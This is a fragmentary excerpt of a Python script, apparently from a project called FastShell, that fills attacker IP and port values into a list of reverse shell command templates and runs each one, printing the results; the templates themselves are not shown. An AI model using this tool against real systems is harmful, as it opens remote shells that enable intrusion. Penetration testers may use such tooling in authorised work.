...
# Made by Yusuf YENICERI
# https://github.com/Yusuf-YENICERI/FastShell

# Reverse shell commands are taken from the follıwing link:
...
def correctify_things(command, ip, port):
    return command.replace("{shell}","sh").replace("{ip}",ip).replace("{port}",port)
...
if len(sys.argv) < 4:
    print("Usage: python3 revshell.py \"your command and {revshell}\" \"ip\" \"port\" ...")
    sys.exit(1)
...
for i in range(0,len(data)-1):
    command = correctify_things(data[i]["command"], ip,port)
    ...
    # Print the output
    print("output:", result.stdout, ", return code:", result.returncode)
